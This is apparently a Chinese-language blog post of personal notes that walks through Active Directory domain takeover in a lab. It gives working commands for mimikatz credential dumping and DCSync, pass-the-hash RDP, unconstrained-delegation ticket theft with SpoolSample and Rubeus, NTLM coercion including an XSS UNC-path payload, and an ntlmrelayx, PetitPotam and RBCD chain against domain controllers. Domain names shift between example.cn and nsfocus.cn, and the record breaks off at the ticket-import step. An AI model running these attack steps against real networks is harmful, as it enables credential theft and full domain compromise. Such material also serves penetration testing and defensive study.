+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::setntlm /server:&lt;域控IP或完整域名&gt; /user:&lt;username&gt; /ntlm:&lt;ntml hash值&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>lsadump::setntlm &#x2F;server:192.168.30.10 &#x2F;user:administrator &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f</p>
+<p>成功改回来了，但是系统会话还是保持的并不会让我们重新登陆</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164438706.png"
+                      alt="image-20230813164438706"
+                ></p>
+<h3 id="通过HASH登陆RDP—解不出hash怎么办"><a href="#通过HASH登陆RDP—解不出hash怎么办" class="headerlink" title="通过HASH登陆RDP—解不出hash怎么办"></a>通过HASH登陆RDP—解不出hash怎么办</h3><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h4><p>获取某用户的NTLM HASH，但是解密不出明文密码，目标机器只能通3389</p>
+<p>如果使用hash远程登录RDP，服务端需要开启”Restricted Admin Mode”</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa”/v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>&#x2F;&#x2F;0x0代表开启</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813165735129.png"
+                      alt="image-20230813165735129"
+                ></p>
+<p>mimikatz</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::pth /user:用户名 /domain:hack-my.com /ntlm:ntlm hash值 &quot;/run:mstsc.exe/restrictedadmin&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
+<p>不清楚为什么失败了，之后再看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813170132283.png"
+                      alt="image-20230813170132283"
+                ></p>
+<p>xfreerdp</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:用户名 /d:hack-my.com /pth:hash值 /v:172.23.119.83</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻击域控方式"><a href="#攻击域控方式" class="headerlink" title="攻击域控方式"></a>攻击域控方式</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h4><p>前提：需要一个域用户</p>
+<p>使普通用户提权到域控权限的权限提升漏洞</p>
+<h4 id="zerologon（CVE-2020-1472）"><a href="#zerologon（CVE-2020-1472）" class="headerlink" title="zerologon（CVE-2020-1472）"></a>zerologon（CVE-2020-1472）</h4><p>未经身份认证的攻击者可通过使用Netlogon远程协议（MS-NRPC）连接域控来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限</p>
+<h4 id="NoPac（CVE-2021-42278-CVE-2021-42287）"><a href="#NoPac（CVE-2021-42278-CVE-2021-42287）" class="headerlink" title="NoPac（CVE-2021-42278+CVE-2021-42287）"></a>NoPac（CVE-2021-42278+CVE-2021-42287）</h4><p>前提：需要一个域用户</p>
+<p>获取域控权限</p>
+<h4 id="ADCS（CVE-2022-26923）"><a href="#ADCS（CVE-2022-26923）" class="headerlink" title="ADCS（CVE-2022-26923）"></a>ADCS（CVE-2022-26923）</h4><p>允许低权限用户再安装了AD证书服务（AD CS）服务器角色的AD环境中将权限提升至域管理员</p>
+<p>前提：判断是否存在证书服务器</p>
+<p>需要一个域用户</p>
+<h4 id="printNifhtmare（CVE-2021-1675、CVE-2021-34527）"><a href="#printNifhtmare（CVE-2021-1675、CVE-2021-34527）" class="headerlink" title="printNifhtmare（CVE-2021-1675、CVE-2021-34527）"></a>printNifhtmare（CVE-2021-1675、CVE-2021-34527）</h4><p>前提：需要一个域用户、域控能访问到跳板机的smb匿名共享</p>
+<p>获取域控权限</p>
+<h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>当一个服务账号&#x2F;机器账号设置了非约束性委派属性后，如果有用户认证使用了该服务，那么后续就可以通过该服务去伪造用户的权限</p>
+<p>当servicel的服务账户开启了非约束委派之后，user访问servicel时候，servicel会将user的TGT保存在内存中，然后servicel就可以利用TGT以user的身份去访问域中任何user可以访问的服务</p>
+<h5 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h5><p>查询域内设置了非约束性委派的服务账户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172344806.png"
+                      alt="image-20230813172344806"
+                ></p>
+<p>查询域内设置了非约束性委派的机器账户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172450287.png"
+                      alt="image-20230813172450287"
+                ></p>
+<h5 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h5><h6 id="被动"><a href="#被动" class="headerlink" title="被动"></a>被动</h6><p>让域管理员连接设置了非约束委派的服务</p>
+<p>设置Alice为非约束委派</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181147179.png"
+                      alt="image-20230813181147179"
+                ></p>
+<p>查询域内设置了非约束委派的服务账户</p>
+<p>Alice上执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181607999.png"
+                      alt="image-20230813181607999"
+                ></p>
+<p>查询域内设置了非约束委派的机器账户</p>
+<p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181742730.png"
+                      alt="image-20230813181742730"
+                ></p>
+<h6 id="接下来开始攻击-利用1"><a href="#接下来开始攻击-利用1" class="headerlink" title="接下来开始攻击  利用1"></a>接下来开始攻击  利用1</h6><p>可以让域管理员访问被控主机</p>
+<p>前提：找到配置了非约束委派的机器Alice并获得了管理员权限</p>
+<p>到域控执行，让域管理员访问Alice，就会在Alice主机中产生TGT票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\Alice.hack-my.com</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182226695.png"
+                      alt="image-20230813182226695"
+                ></p>
+<p>然后Alice利用mimikatz导出保存的票据，发现具有administrator的票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182340010.png"
+                      alt="image-20230813182340010"
+                ></p>
+<p>然后就利用下面这个命令，使用这个导出的票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;3fe27c]-2-1-40e10000-Administrator@krbtgt-HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183052518.png"
+                      alt="image-20230813183052518"
+                ></p>
+<p>好像报错了，但是连接是可以建立的</p>
+<p>通过连接，即可访问dc的目录</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.hack-my.com\c$</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183251293.png"
+                      alt="image-20230813183251293"
+                ></p>
+<p>这种方式在实战情况下，除非域管理员连接过该服务，否则十分的鸡肋</p>
+<p>通过社工钓鱼等方式让域管主动去访问设置了非约束委派的服务的机器</p>
+<p>比如WinRM服务远程连接或者域管理员账号登录目标主机等</p>
+<h6 id="利用spooler打印机服务让域控主动连接"><a href="#利用spooler打印机服务让域控主动连接" class="headerlink" title="利用spooler打印机服务让域控主动连接"></a>利用spooler打印机服务让域控主动连接</h6><p>在spooler服务默认开启的情况下，域用户可以利用Windows打印系统远程协议强制任何运行了spooler服务的域内主机就通过kerberos或者NTLM对任何目标进行身份验证</p>
+<p>主要原理就是强迫运行打印机服务（Print Spooler）的主机向目标主机发起Kerberos或者NTLM认证请求</p>
+<p>因为在Spooler服务默认开启的情况下，域用户可以利用windows打印机系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行认证</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需要</span><br><span class="line">administrator权限</span><br><span class="line">得到域用户的账户密码</span><br><span class="line">域控打开打印机服务</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>攻击流程</strong></p>
+<p>首先域控得先打开打印机服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query spooler</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813184424791.png"
+                      alt="image-20230813184424791"
+                ></p>
+<p>有一种是直接运行SpoolSample</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>还有一种是利用rubeus进行的</p>
+<p>先利用Rubeus在域用户主机上运行，需要本地管理员权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br></pre></td></tr></table></figure></div>
+
+<p>这边主机环境有问题暂时运行不起来</p>
+<p>上个贴图吧</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png"
+                      alt="img"
+                ></p>
+<p>然后需要利用SpoolSample让域控强制向本机进行身份验证</p>
+<p>需要以域用户身份运行</p>
+<p>然后运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png"
+                      alt="img"
+                ></p>
+<p>这个加了换行，所以可以用python去掉换行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=&quot;&quot;</span><br><span class="line">for line in open(&#x27;1.txt&#x27;,&#x27;r&#x27;):</span><br><span class="line">    data += line.strip(&#x27;\n&#x27;)</span><br><span class="line">with open(&quot;2.txt&quot;,&#x27;a&#x27;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&#x27;保存完毕&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>复制2.txt中的TGT</p>
+<p>本地管理员权限运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket: 2.txt中的TGT值</span><br></pre></td></tr></table></figure></div>
+
+<p>然后mimikatz执行，就可以获取krbtgt的NTLM hash值了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>然后也能用smbexec.py获取域控权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :NTLM-HASH administrator@192.168.30.10</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>由于非约束委派的不安全性，微软在win2003中发布了约束委派功能，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p>
+<h6 id="S4U2Self：用于生成本身服务ST票据"><a href="#S4U2Self：用于生成本身服务ST票据" class="headerlink" title="S4U2Self：用于生成本身服务ST票据"></a>S4U2Self：用于生成本身服务ST票据</h6><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户的对当前受约束委派服务的票据ST，该服务票据ST包含了用户的相关信息，如用户的信息组等</p>
+<h6 id="S4U2proxy：保证只能访问特定服务（最大区别）"><a href="#S4U2proxy：保证只能访问特定服务（最大区别）" class="headerlink" title="S4U2proxy：保证只能访问特定服务（最大区别）"></a>S4U2proxy：保证只能访问特定服务（最大区别）</h6><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务</p>
+<p>在约束委派中，用户还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务作了限制</p>
+<p>他不允许受委派的服务代表用户使用这个TGT去访问任意服务，而只能访问指定服务</p>
+<p>在S4U2proxy过程会通过判断msds-allowedtodelegateto里的SPN值来确定是否可以申请到service2的ST</p>
+<h5 id="攻击手法-1"><a href="#攻击手法-1" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>设置了约束委派的服务账户&#x2F;机器账户能访问域控服务，如CISF</p>
+<h5 id="查找方法-1"><a href="#查找方法-1" class="headerlink" title="查找方法"></a>查找方法</h5><h6 id="查询域内设置了约束委派的服务账户"><a href="#查询域内设置了约束委派的服务账户" class="headerlink" title="查询域内设置了约束委派的服务账户"></a>查询域内设置了约束委派的服务账户</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="查询域内设置了约束委派的机器账户"><a href="#查询域内设置了约束委派的机器账户" class="headerlink" title="查询域内设置了约束委派的机器账户"></a>查询域内设置了约束委派的机器账户</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="基于资源的委派"><a href="#基于资源的委派" class="headerlink" title="基于资源的委派"></a>基于资源的委派</h4><p>简单来说就是一台机器的服务资源（如CIFS服务）可以通过设置msDS-AllowedToActOnBehalfOfOtherIdentity属性指向一个委派账户，被委派的账户即可拥有访问该服务的权限</p>
+<p>原理：如果获取了一个用户A权限，用户A对机器B具有修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，那么可以通过修改B的这个属性，修改为具有SPN的账户C的SID，再使用账户C的权限伪造S4U请求去申请机器B的CIFS服务的ST即可访问CIFS服务</p>
+<h5 id="谁可以修改这台机器的该属性"><a href="#谁可以修改这台机器的该属性" class="headerlink" title="谁可以修改这台机器的该属性"></a>谁可以修改这台机器的该属性</h5><ol>
+<li>将机器加入域的域用户</li>
+<li>Account Operator组成员</li>
+<li>该主机的机器账户本身</li>
+</ol>
+<p>限制：只能在win2012及以上版本的域控才可以，08以下没有这个属性</p>
+<h5 id="查找方法-2"><a href="#查找方法-2" class="headerlink" title="查找方法"></a>查找方法</h5><h6 id="哪个用户把这个机器加入域"><a href="#哪个用户把这个机器加入域" class="headerlink" title="哪个用户把这个机器加入域"></a>哪个用户把这个机器加入域</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 192.168.30.20（域控IP） -b &quot;DC=hack-my,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="查询某个用户把哪些机器加入域"><a href="#查询某个用户把哪些机器加入域" class="headerlink" title="查询某个用户把哪些机器加入域"></a>查询某个用户把哪些机器加入域</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1 Get-DomainUser -Identity addUser -Properties objectsid</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="攻击手法-2"><a href="#攻击手法-2" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>获取服务器权限</p>
+<p>Account Operators组用户拿下主机</p>
+<p>结合NTLM Relay接管域控（CVE-2019-1040）</p>
+<p>委派部分的将会单独做出复现笔记</p>
+<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><h4 id="发起NTLM请求"><a href="#发起NTLM请求" class="headerlink" title="发起NTLM请求"></a>发起NTLM请求</h4><h5 id="攻击手法-3"><a href="#攻击手法-3" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>使受害机器自动使用当前用户凭据向恶意服务器发起NTLM认证</p>
+<p>拿到hash值之后利用hashcat进行爆破</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 5600 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h6 id="PrinterBug"><a href="#PrinterBug" class="headerlink" title="PrinterBug"></a>PrinterBug</h6><p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发给指定目标。之后会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）并且，由于Print Spooler服务以SYSTEM账户的身份运行，因此最后截获的使目标机器账户的Net-NTLM Hash</p>
+<p>前提：需要一个域用户，目标机器开启Print Spooler服务</p>
+<h6 id="PetitPatam漏洞"><a href="#PetitPatam漏洞" class="headerlink" title="PetitPatam漏洞"></a>PetitPatam漏洞</h6><p>Windows操作系统中一个新发现的安全漏洞可被利用来强制远程Windows服务器（包括域控）向恶意目的地进行身份验证，从而允许攻击者发起NTLM中继攻击并完全接管Windows域</p>
+<p>前提：需要一个域用户</p>
+<h6 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h6><p>在Windows系统中，通过设置指向恶意服务器的UNC路径，能够使受害者机器自动使用当前账户凭证向恶意服务器发起NTLM认证</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\恶意服务器\\share</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h6><p>xss</p>
+<p>构造UNC路径</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>只适用于IE和Edge浏览器，其他浏览器不允许从http域跨域到file域</p>
+<h4 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h4><p>中间人在网络上的客户端和服务器之间拦截并传递身份认证流量</p>
+<h6 id="如何触发客户端向服务器发起NTLM认证请求"><a href="#如何触发客户端向服务器发起NTLM认证请求" class="headerlink" title="如何触发客户端向服务器发起NTLM认证请求"></a>如何触发客户端向服务器发起NTLM认证请求</h6><p>就是上面说发“发起NTLM请求”的内容</p>
+<h5 id="攻击手法-4"><a href="#攻击手法-4" class="headerlink" title="攻击手法"></a>攻击手法</h5><h6 id="中继至LDAP利用"><a href="#中继至LDAP利用" class="headerlink" title="中继至LDAP利用"></a>中继至LDAP利用</h6><p>在域环境中，关键的LDAP数据库就是域控制器上的活动目录。通常情况下，测试人员可以将NTLM请求中继到LDAP，从而直接操作活动目录</p>
+<p>为了确保LDAP服务免受中间人攻击，微软引入了LDAP签名。当LDAP服务器启用LDAP签名之后，客户端必须协商数签名，否则无法执行LDAP查询</p>
+<p>默认情况下，LDAP客户端的签名策略为协商签名，即服务器与客户端协商是否签名，而签名与否有客户端决定。</p>
+<p>如果客户端时SMB协议（SMB to LDAP），就默认要求LDAP服务器对NTLM认证请求强制签名。如果时WebDAV或HTTP，就不要求签名</p>
+<h6 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h6><p>利用该漏洞可绕过NTLM MIC的防护机制，结合其他漏洞或机制，在某些场景下可以导致域内的普通用户直接获取域控的权限</p>
+<p>结合NTLM Relay接管域控（CVE-2019-1040）</p>
+<h6 id="Exchange-CVE-2019-1040接管全域"><a href="#Exchange-CVE-2019-1040接管全域" class="headerlink" title="Exchange+CVE-2019-1040接管全域"></a>Exchange+CVE-2019-1040接管全域</h6><p>在恶意服务器上启动ntlmrelayx.py监听</p>
+<p>利用PetitPotam漏洞，迫使EXchange Server主机向恶意服务器发起NTLM认证请求。此时ntlmrelayx.py将截获Exchange Server机器账户的Net-NTLM Hash，并将其中继到域控的LDAP服务。因为Exchange Server机器默认拥有WriteDACL权限，可以为普通域用户赋予DCSync权限（通过PetitPotam发起的认证请求为SMB协议的请求，在正常情况下LDAP服务会要求客户端签名,CVE-2019-1040可绕过）</p>
+<p>赋予普通用户DCSync权限此时就可以导出域内Hash</p>
+<h6 id="RBCD（基于资源的约束委派）-petitpotam-CVE-2019-1040接管全域"><a href="#RBCD（基于资源的约束委派）-petitpotam-CVE-2019-1040接管全域" class="headerlink" title="RBCD（基于资源的约束委派）+petitpotam+CVE-2019-1040接管全域"></a>RBCD（基于资源的约束委派）+petitpotam+CVE-2019-1040接管全域</h6><p><strong>场景</strong></p>
+<p>域名：example.cn</p>
+<p>域控：</p>
+<p>192.168.122.1 Dc01.example.cn</p>
+<p>192.168.122.2 Dc02.example.cn</p>
+<p>攻击机（恶意服务器）</p>
+<p>192.168.122.188</p>
+<p>并且已知拿下一个普通域用户权限python</p>
+<p><strong>操作</strong></p>
+<p>以普通域用户pyhton身份在域中添加一个名为“HACKER$”的机器账户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -dc-ip 192.168.122.1 -computer-name HACKER\$ -computer-pass Password example.cn/python:Admin\@123</span><br></pre></td></tr></table></figure></div>
+
+<p>在恶意服务器上启动ntlmrelayx.py监听</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ntlmrelayx.py -t ldap://192.168.122.1 -remove-mic --delegate-access --escalate-user HACKER\$</span><br></pre></td></tr></table></figure></div>
+
+<p>通过PetitPotam迫使DC0.example.cn主机向恶意服务器发起NTLM认证请求</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -d nsfocus.cn -u python -p Admin\@123 192.168.122.188 192.168.122.2</span><br></pre></td></tr></table></figure></div>
+
+<p>此时ntlmrelay.py将截获DC02.example.cn机器账户的Net-NTLM Hash，并将其中中继到DC01.example.cn的LDAP服务来修改msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
+<p>通过ADExplorer查看DC02.example.cn主机信息，他的</p>
+<p>msDS-AllowedToActOnBehalfOfOtherIdentity属性已经被设置为HACKER$机器的SID，说明允许HACKER$代表用户访问DC02.example.cn主机的资源</p>
+<p>然后申请票据，获取用于访问DC02.example.cn机器CIFS服务器的高权限票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.122.1 nsfocus.cn/HACKER\$:password -spn cifs /DC02.nsfocus.cn -impersonate administrator</span><br></pre></td></tr></table></figure></div>
+
+<p>导入票据</p>
